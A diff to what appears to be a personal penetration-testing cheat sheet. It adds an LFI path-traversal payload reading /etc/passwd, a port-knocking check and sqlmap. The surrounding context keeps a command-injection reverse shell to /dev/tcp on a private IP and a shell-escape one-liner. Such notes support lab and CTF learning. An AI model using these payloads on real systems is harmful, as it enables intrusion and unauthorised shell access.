@@ -1396,6 +1396,11 @@ bash/zsh + linux terminal cli tools commands
 - sudo -l: list of allowed/forbidden sudo commands
 
 ---------------------------------------------------------------------
+LFI (Local File Inclusion)
+---------------------------------------------------------------------
+- ?file=../../../../../etc/passwd
+
+---------------------------------------------------------------------
 escape ksh (korn shell)
 ---------------------------------------------------------------------
 - echo os.system('/bin/bash')
@@ -1454,14 +1459,19 @@ command injection
 ---------------------------------------------------------------------
 - reverse shell: ;bash -i >& /dev/tcp/192.168.1.16/1234 0>&1
 ---------------------------------------------------------------------
-useful enumeration tools
+useful enumeration tools & checks
 ---------------------------------------------------------------------
 - web:
   - nikto
   - dirb
   - ffuf
+  - sqlmap
+  - checks:
+    - LFI
 - search exploits:
   - searchsploit
+- port knocking
+  - check /etc/knockd.conf
 ---------------------------------------------------------------------
 virtualbox setup internal network
 ---------------------------------------------------------------------
